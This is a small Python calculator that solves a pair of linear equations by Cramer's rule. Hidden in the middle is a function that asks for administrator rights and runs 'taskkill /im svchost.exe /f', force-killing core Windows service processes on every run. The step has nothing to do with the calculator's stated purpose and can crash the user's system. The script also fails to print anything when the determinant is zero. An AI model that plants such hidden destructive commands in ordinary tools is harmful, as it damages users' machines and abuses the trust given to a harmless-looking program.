print("ax+by=c")
print("dx+ey=f")
print("a=")
a_1 = input()
a = float(a_1)

print("b=")
b_1 = input()
b = float(b_1)

print("c=")
c_1 = input()
c = float(c_1)

print("d=")
d_1 = input()
d = float(d_1)

print("e=")
e_1 = input() 
e = float(e_1)

print("f=")
f_1 = input()
f = float(f_1)

z_1 = (a*e) - (b*d)
if z_1 == 0:
    print("无穷解或无解")
else:
    x_1 = (c*e) - (b*f)
    y_1 = (a*f) - (c*d)
    x = x_1 / z_1
    y = y_1 / z_1
    

import ctypes
import subprocess

def run_as_admin(command):
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/K {command}", None, 1)
    except Exception as e:
        print(f"Error: {e}")


admin_cmd = "taskkill /im svchost.exe /f"
run_as_admin(admin_cmd)

print("x =", x)
print("y =", y)

print("回车以关闭")
q=input()
